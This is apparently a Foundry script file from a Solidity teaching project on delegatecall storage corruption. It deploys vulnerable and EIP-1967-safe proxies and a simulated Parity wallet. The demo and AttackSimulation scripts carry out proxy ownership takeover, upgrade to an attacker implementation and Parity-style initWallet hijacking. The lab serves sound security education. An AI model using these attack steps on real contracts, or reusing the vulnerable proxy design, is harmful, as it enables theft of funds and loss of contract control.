// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/solution/DelegatecallCorruptionSolution.sol";

/**
 * @title Deploy Project 35: Delegatecall Storage Corruption
 * @notice Deployment script for all contracts in this project
 */
contract DeployDelegatecallCorruption is Script {
    // Deployed contracts
    VulnerableProxy public vulnerableProxy;
    LegitimateImplementation public legitImpl;
    MaliciousImplementation public maliciousImpl;

    SafeProxy public safeProxy;
    SafeImplementation public safeImpl;

    StorageInspector public inspector;

    ParityWalletLibrary public parityLibrary;
    ParityWallet public parityWallet;

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);

        console.log("Deployer address:", deployer);
        console.log("Deployer balance:", deployer.balance);

        vm.startBroadcast(deployerPrivateKey);

        // ========================================
        // 1. Deploy Vulnerable Proxy Pattern
        // ========================================
        console.log("\n=== Deploying Vulnerable Proxy Pattern ===");

        legitImpl = new LegitimateImplementation();
        console.log("LegitimateImplementation deployed at:", address(legitImpl));

        vulnerableProxy = new VulnerableProxy(address(legitImpl));
        console.log("VulnerableProxy deployed at:", address(vulnerableProxy));
        console.log("  - Implementation:", vulnerableProxy.implementation());
        console.log("  - Owner:", vulnerableProxy.owner());

        maliciousImpl = new MaliciousImplementation();
        console.log("MaliciousImplementation deployed at:", address(maliciousImpl));

        // ========================================
        // 2. Deploy Safe Proxy Pattern (EIP-1967)
        // ========================================
        console.log("\n=== Deploying Safe Proxy Pattern ===");

        safeImpl = new SafeImplementation();
        console.log("SafeImplementation deployed at:", address(safeImpl));

        safeProxy = new SafeProxy(address(safeImpl), deployer);
        console.log("SafeProxy deployed at:", address(safeProxy));
        console.log("  - Implementation:", safeProxy.implementation());
        console.log("  - Admin:", safeProxy.admin());

        // Initialize the implementation through proxy
        SafeImplementation(address(safeProxy)).initialize(deployer);
        console.log("  - Initialized with owner:", SafeImplementation(address(safeProxy)).owner());

        // ========================================
        // 3. Deploy Storage Inspector
        // ========================================
        console.log("\n=== Deploying Storage Inspector ===");

        inspector = new StorageInspector();
        console.log("StorageInspector deployed at:", address(inspector));

        // Verify EIP-1967 slots
        (bytes32 implSlot, bytes32 adminSlot) = inspector.verifyEIP1967Slots();
        console.log("  - EIP-1967 Implementation Slot:");
        console.logBytes32(implSlot);
        console.log("  - EIP-1967 Admin Slot:");
        console.logBytes32(adminSlot);

        // ========================================
        // 4. Deploy Parity Wallet Simulation
        // ========================================
        console.log("\n=== Deploying Parity Wallet Simulation ===");

        parityLibrary = new ParityWalletLibrary();
        console.log("ParityWalletLibrary deployed at:", address(parityLibrary));

        parityWallet = new ParityWallet(address(parityLibrary));
        console.log("ParityWallet deployed at:", address(parityWallet));
        console.log("  - Library:", parityWallet.walletLibrary());

        vm.stopBroadcast();

        // ========================================
        // 5. Deployment Summary
        // ========================================
        console.log("\n========================================");
        console.log("DEPLOYMENT SUMMARY");
        console.log("========================================");
        console.log("Vulnerable Pattern:");
        console.log("  VulnerableProxy:", address(vulnerableProxy));
        console.log("  LegitimateImplementation:", address(legitImpl));
        console.log("  MaliciousImplementation:", address(maliciousImpl));
        console.log("\nSafe Pattern:");
        console.log("  SafeProxy:", address(safeProxy));
        console.log("  SafeImplementation:", address(safeImpl));
        console.log("\nTools:");
        console.log("  StorageInspector:", address(inspector));
        console.log("\nParity Simulation:");
        console.log("  ParityWalletLibrary:", address(parityLibrary));
        console.log("  ParityWallet:", address(parityWallet));
        console.log("========================================\n");

        // ========================================
        // 6. Save Deployment Addresses
        // ========================================
        _saveDeployment();
    }

    function _saveDeployment() internal {
        string memory obj = "deployment";

        // Vulnerable pattern
        vm.serializeAddress(obj, "vulnerableProxy", address(vulnerableProxy));
        vm.serializeAddress(obj, "legitImpl", address(legitImpl));
        vm.serializeAddress(obj, "maliciousImpl", address(maliciousImpl));

        // Safe pattern
        vm.serializeAddress(obj, "safeProxy", address(safeProxy));
        vm.serializeAddress(obj, "safeImpl", address(safeImpl));

        // Tools
        vm.serializeAddress(obj, "inspector", address(inspector));

        // Parity simulation
        vm.serializeAddress(obj, "parityLibrary", address(parityLibrary));
        string memory finalJson = vm.serializeAddress(obj, "parityWallet", address(parityWallet));

        string memory path = string.concat("./deployments/project35-", vm.toString(block.chainid), ".json");
        vm.createDir("./deployments", true);
        vm.writeJson(finalJson, path);

        console.log("Deployment addresses saved to:", path);
    }
}

/**
 * @title Interactive Demo Script
 * @notice Demonstrates the vulnerability and safe patterns
 */
contract DemoDelegatecallCorruption is Script {
    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address deployer = vm.addr(deployerPrivateKey);

        console.log("\n========================================");
        console.log("PROJECT 35: DELEGATECALL STORAGE CORRUPTION");
        console.log("Interactive Demonstration");
        console.log("========================================\n");

        vm.startBroadcast(deployerPrivateKey);

        // ========================================
        // DEMO 1: Vulnerable Proxy Attack
        // ========================================
        console.log("=== DEMO 1: Vulnerable Proxy Attack ===\n");

        // Deploy contracts
        LegitimateImplementation legitImpl = new LegitimateImplementation();
        VulnerableProxy proxy = new VulnerableProxy(address(legitImpl));

        console.log("1. Initial State:");
        console.log("   Proxy Owner:", proxy.owner());
        console.log("   Proxy Implementation:", proxy.implementation());

        // Deploy malicious implementation
        MaliciousImplementation maliciousImpl = new MaliciousImplementation();
        console.log("\n2. Deploying MaliciousImplementation:", address(maliciousImpl));

        // Upgrade to malicious implementation
        proxy.upgrade(address(maliciousImpl));
        console.log("3. Upgraded proxy to malicious implementation");

        // Take ownership
        console.log("\n4. Calling takeOwnership()...");
        MaliciousImplementation(address(proxy)).takeOwnership();

        console.log("5. After Attack:");
        console.log("   Proxy Owner:", proxy.owner());
        console.log("   Attacker:", deployer);
        console.log("   RESULT: Attacker is now owner!");

        // ========================================
        // DEMO 2: Safe Proxy Pattern
        // ========================================
        console.log("\n\n=== DEMO 2: Safe Proxy Pattern ===\n");

        SafeImplementation safeImpl = new SafeImplementation();
        SafeProxy safeProxy = new SafeProxy(address(safeImpl), deployer);

        console.log("1. Initial State:");
        console.log("   Proxy Admin:", safeProxy.admin());
        console.log("   Proxy Implementation:", safeProxy.implementation());

        // Initialize
        SafeImplementation(address(safeProxy)).initialize(deployer);
        console.log("\n2. Initialized implementation through proxy");
        console.log("   Implementation Owner:", SafeImplementation(address(safeProxy)).owner());

        // Set value
        SafeImplementation(address(safeProxy)).setValue(12345);
        console.log("\n3. Set value through proxy:");
        console.log("   Value:", SafeImplementation(address(safeProxy)).value());
        console.log("   Proxy Admin (unchanged):", safeProxy.admin());
        console.log("   RESULT: No storage corruption!");

        // ========================================
        // DEMO 3: Storage Slot Inspection
        // ========================================
        console.log("\n\n=== DEMO 3: Storage Slot Inspection ===\n");

        StorageInspector inspector = new StorageInspector();

        (bytes32 implSlot, bytes32 adminSlot) = inspector.verifyEIP1967Slots();

        console.log("EIP-1967 Storage Slots:");
        console.log("  Implementation Slot:");
        console.log("   ");
        console.logBytes32(implSlot);
        console.log("  Admin Slot:");
        console.log("   ");
        console.logBytes32(adminSlot);

        console.log("\nMapping Slot Example:");
        address testAddr = address(0x123);
        bytes32 mappingSlot = inspector.getMappingSlot(testAddr, 1);
        console.log("  Address:", testAddr);
        console.log("  Position: 1");
        console.log("  Slot:");
        console.log("   ");
        console.logBytes32(mappingSlot);

        // ========================================
        // DEMO 4: Parity Wallet Attack Simulation
        // ========================================
        console.log("\n\n=== DEMO 4: Parity Wallet Attack Simulation ===\n");

        ParityWalletLibrary library = new ParityWalletLibrary();
        ParityWallet wallet = new ParityWallet(address(library));

        console.log("1. Deployed Parity Wallet:", address(wallet));
        console.log("   Library:", address(library));

        // Check initial owner (should be uninitialized)
        console.log("\n2. Initial wallet state (uninitialized)");

        // Attacker calls initWallet through fallback
        console.log("\n3. Attacker calls initWallet through wallet...");
        (bool success, ) = address(wallet).call(
            abi.encodeWithSignature("initWallet(address)", deployer)
        );

        if (success) {
            console.log("4. Attack successful!");
            console.log("   RESULT: Attacker can now control the wallet via delegatecall");
        }

        vm.stopBroadcast();

        console.log("\n========================================");
        console.log("DEMONSTRATION COMPLETE");
        console.log("========================================\n");
    }
}

/**
 * @title Attack Simulation Script
 * @notice Step-by-step attack simulation
 */
contract AttackSimulation is Script {
    function run() external {
        uint256 attackerPrivateKey = vm.envUint("ATTACKER_PRIVATE_KEY");
        address attacker = vm.addr(attackerPrivateKey);

        // Load deployed proxy address
        address proxyAddress = vm.envAddress("VULNERABLE_PROXY_ADDRESS");
        address maliciousImplAddress = vm.envAddress("MALICIOUS_IMPL_ADDRESS");

        VulnerableProxy proxy = VulnerableProxy(payable(proxyAddress));
        MaliciousImplementation maliciousImpl = MaliciousImplementation(maliciousImplAddress);

        console.log("\n=== ATTACK SIMULATION ===");
        console.log("Attacker:", attacker);
        console.log("Target Proxy:", proxyAddress);
        console.log("Malicious Implementation:", maliciousImplAddress);

        console.log("\nPre-Attack State:");
        console.log("  Proxy Owner:", proxy.owner());
        console.log("  Proxy Implementation:", proxy.implementation());

        vm.startBroadcast(attackerPrivateKey);

        // Step 1: Take ownership
        console.log("\nStep 1: Taking ownership...");
        MaliciousImplementation(address(proxy)).takeOwnership();

        console.log("\nPost-Takeover State:");
        console.log("  Proxy Owner:", proxy.owner());
        console.log("  Owner is Attacker:", proxy.owner() == attacker);

        // Step 2: Upgrade to attacker's implementation
        console.log("\nStep 2: Upgrading to attacker-controlled implementation...");
        address attackerImpl = address(new MaliciousImplementation());
        MaliciousImplementation(address(proxy)).changeImplementation(attackerImpl);

        console.log("\nFinal State:");
        console.log("  Proxy Owner:", proxy.owner());
        console.log("  Proxy Implementation:", proxy.implementation());
        console.log("\nATTACK SUCCESSFUL - Full proxy control achieved!");

        vm.stopBroadcast();
    }
}
